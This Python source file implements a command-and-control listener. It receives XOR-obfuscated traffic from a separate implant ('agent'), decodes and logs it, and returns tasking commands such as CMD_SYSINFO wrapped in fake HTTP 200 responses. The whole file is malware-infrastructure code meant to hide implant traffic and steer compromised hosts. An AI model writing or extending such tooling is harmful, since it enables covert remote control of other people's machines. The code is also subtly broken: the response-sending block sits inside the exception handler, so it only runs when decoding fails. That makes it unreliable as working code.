import socket

PORT = 8000
# Must perfectly match the multi-byte key used in agent/main.c
OBFUSCATION_KEY = [0x4A, 0x76, 0x31, 0x2C, 0x5E, 0x09, 0x1F, 0x6B]

def XOR_Transform(raw_bytes: bytearray) -> bytearray:
    """
    Applies an in-place rolling XOR transformation.
    Because XOR is symmetric, running this on cipher text yields plaintext.
    """
    key_length = len(OBFUSCATION_KEY)
    for i in range(len(raw_bytes)):
        raw_bytes[i] ^= OBFUSCATION_KEY[i % key_length]
    return raw_bytes

def StartRawListener():
    # Initialize a standard IPv4 TCP Streaming socket
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    # Allow the port to be instantly reused upon restarting the script
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    server_socket.bind(("0.0.0.0", PORT))
    server_socket.listen(5)
    
    print(f"[*] Layer 4 C2 Listener active on port {PORT}...")
    print("[*] Awaiting obfuscated custom byte streams...\n")

    try:
        while True:
            # Block until an agent establishes a TCP handshake
            client_socket, client_address = server_socket.accept()
            
            # Read the incoming stream from the socket buffer (up to 2048 bytes)
            scrambled_packet = client_socket.recv(2048)
            if not scrambled_packet:
                client_socket.close()
                continue

            print(f"[+] Connection established from {client_address[0]}")
            print(f"    [Wire View] Raw Encrypted Bytes: {scrambled_packet[:20]}")

            # 1. Convert the read buffer to a mutable bytearray and strip obfuscation
            payload_buffer = bytearray(scrambled_packet)
            decrypted_bytes = XOR_Transform(payload_buffer)
            
            # 2. Safely decode the decrypted bytes back into an ASCII/UTF-8 string
            try:
                plaintext_http = decrypted_bytes.decode('utf-8', errors='ignore')
                print("\n[+] Decryption Successful! Reconstructed Plaintext HTTP Stream:")
                print("------------------------------------------------------------")
                print(plaintext_http)
                print("------------------------------------------------------------")
            except Exception as decode_error:
                print(f"[-] Data decrypted, but parsing to string failed: {decode_error}")

            # 3. Formulate a simple HTTP response. 
            # To avoid confusing our agent's Winsock channel, we send a valid HTTP 200 OK block back.
            
            # Change this variable manually in your code to test different execution routes
            # Options: "CMD_PING", "CMD_SYSINFO", "CMD_EXIT"
                pending_task = "CMD_SYSINFO" 

            # Formulate the response with the precise Content-Length of your command
                http_response = (
                    "HTTP/1.1 200 OK\r\n"
                    "Content-Type: text/plain\r\n"
                    f"Content-Length: {len(pending_task)}\r\n"
                    "Connection: close\r\n"
                    "\r\n"
                    f"{pending_task}"
                )

                client_socket.sendall(http_response.encode('utf-8'))
                client_socket.close()
                print("[*] Connection gracefully collapsed.\n")

    except KeyboardInterrupt:
        print("\n[*] Shutting down custom TCP listener.")
    finally:
        server_socket.close()

if __name__ == "__main__":
    StartRawListener()